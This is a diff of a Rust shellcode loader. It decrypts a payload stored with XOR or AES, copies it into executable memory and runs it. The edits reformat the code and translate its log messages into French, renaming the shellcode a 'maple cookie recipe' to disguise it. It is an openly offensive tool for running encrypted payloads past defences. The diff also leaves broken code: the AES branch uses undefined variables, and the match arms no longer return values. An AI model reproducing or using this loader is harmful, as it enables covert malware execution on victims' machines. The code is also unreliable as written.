@@ -5,7 +5,7 @@ use std::fs::OpenOptions;
 use std::io::Write;
 use std::mem;
 
-use serde_derive::{Serialize, Deserialize};
+use serde_derive::{Deserialize, Serialize};
 
 use aes_gcm::{
     aead::{AeadInPlace, KeyInit, OsRng},
@@ -41,7 +41,10 @@ impl ShellCode {
         let shellcode = match std::fs::read(input_path) {
             Ok(result) => result,
             Err(error) => {
-                println!("[+] failed to read la recette des biscuits à l'érable : {:?}", error); // TO FR
+                println!(
+                    "[+] n'a pas lu la recette des biscuits à l'érable : {:?}",
+                    error
+                ); 
                 std::process::exit(0x0100);
             }
         };
@@ -50,18 +53,20 @@ impl ShellCode {
             "xor" => {
                 println!("[+] la recette des biscuits à l'érable dectected as XOR encrypted");
                 let decoded_xor_object: XoredShellCode = bincode::deserialize(&shellcode).unwrap();
-                decoded_xor_object.xor()
-            },
+                decoded_xor_object.xor();
+            }
             "aes" => {
-                println!("[+] la recette du cookie à l'érable a été détectée comme étant cryptée AES");
-                let decoded_aes_object: AESShellCode = bincode::deserialize(&shellcode).unwrap();
-                decoded_aes_object.decrypt()
-            },
+                println!(
+                    "[+] la recette du cookie à l'érable a été détectée comme étant cryptée AES"
+                );
+                let decoded_aes_object: AESShellCode =
+                    bincode::deserialize(&serialized_aes_object).unwrap();
+                my_aes_shellcode.decrypt();
+            }
             "plain" => {
                 println!("[+] la recette des biscuits à l'érable must be raw/normal");
-                ShellCode{sc: shellcode}
-            },
-            &_ => todo!()
+                ShellCode { sc: shellcode }
+            }
         }
     }
 
@@ -72,10 +77,10 @@ impl ShellCode {
 
         unsafe {
             std::ptr::copy(self.sc.as_ptr(), map.data(), self.sc.len());
-            println!("[+] set memory protections at {:p}", self.sc.as_ptr()); // TO FR
+            println!("[+] fixer les protections de la mémoire à {:p}", self.sc.as_ptr()); 
             println!("{:?}", self.sc.as_ptr());
             let exec_shellcode: extern "C" fn() -> ! = mem::transmute(map.data());
-            println!("[+] running la recette des biscuits à l'érable"); // TO FR
+            println!("[+] commencer la recette des biscuits à l'érable"); 
             exec_shellcode();
         }
     }
@@ -113,7 +118,7 @@ impl XoredShellCode {
 
     pub fn xor(self) -> ShellCode {
         let mut xored_shellcode = self.sc.sc.clone();
-        println!("[+] encrypting la recette des biscuits à l'érable using XOR"); // TO FR
+        println!("[+] cryptant la recette des cookies à l'érable en utilisant XOR");
         println!(
             "[+] xor_key (first 5 bytes): {:#04X?}",
             self.xor_key.as_bytes().to_vec()[0..5].to_vec()
@@ -132,7 +137,6 @@ impl XoredShellCode {
     }
 
     pub fn output_to_file(self, output_path: &str) {
-
         let serialized_self = bincode::serialize(&self).unwrap();
 
         println!("{:?}", serialized_self); // DEBUG
@@ -143,13 +147,16 @@ impl XoredShellCode {
         {
             Ok(result) => result,
             Err(_error) => {
-                println!("[+] output path already exists {}", output_path); // TO FR
+                println!("[+] le fichier de sortie existe déjà {}", output_path);
                 std::process::exit(0x0100);
             }
         };
 
         file.write_all(&serialized_self).unwrap();
-        println!("[+] wrote XOR encrypted la recette des biscuits à l'érable to {}", output_path); // TO FR
+        println!(
+            "[+] a écrit une recette de cookies à l'érable cryptée XOR en {}",
+            output_path
+        ); 
     }
 }
 
@@ -171,7 +178,7 @@ impl AESShellCode {
         let mut sc_copy = sc_bytearray;
         cipher.encrypt_in_place(nonce, &rand_assoc_data, &mut sc_copy.sc);
 
-        println!("[+] encrypting la recette des biscuits à l'érable using AES"); // TO FR
+        println!("[+] cryptant la recette des cookies à l'érable en utilisant AES");
         println!(
             "[+] key: (first 5 bytes) {:#04X?}",
             key.clone()[0..5].to_vec()
@@ -194,7 +201,7 @@ impl AESShellCode {
     }
 
     pub fn decrypt(mut self) -> ShellCode {
-        println!("[+] decrypting la recette des biscuits à l'érable using AES"); // TO FR
+        println!("[+] décryptage de la recette des cookies à l'érable en utilisant AES");
         println!("[+] key: (first 5 bytes) {:#04X?}", self.key[0..5].to_vec());
         println!(
             "[+] nonce: (first 5 bytes) {:#04X?}",
@@ -213,7 +220,6 @@ impl AESShellCode {
     }
 
     pub fn output_to_file(self, output_path: &str) {
-
         let serialized_self = bincode::serialize(&self).unwrap();
 
         let mut file = match OpenOptions::new()
@@ -223,12 +229,15 @@ impl AESShellCode {
         {
             Ok(result) => result,
             Err(_error) => {
-                println!("[+] output path already exists {}", output_path); // TO FR
+                println!("[+] le fichier de sortie existe déjà {}", output_path); 
                 std::process::exit(0x0100);
             }
         };
 
         file.write_all(&serialized_self).unwrap();
-        println!("[+] wrote AES encrypted la recette des biscuits à l'érable to {}", output_path); // TO FR
+        println!(
+            "[+] a écrit une recette de cookies à l'érable cryptée AES en {}",
+            output_path
+        );
     }
 }
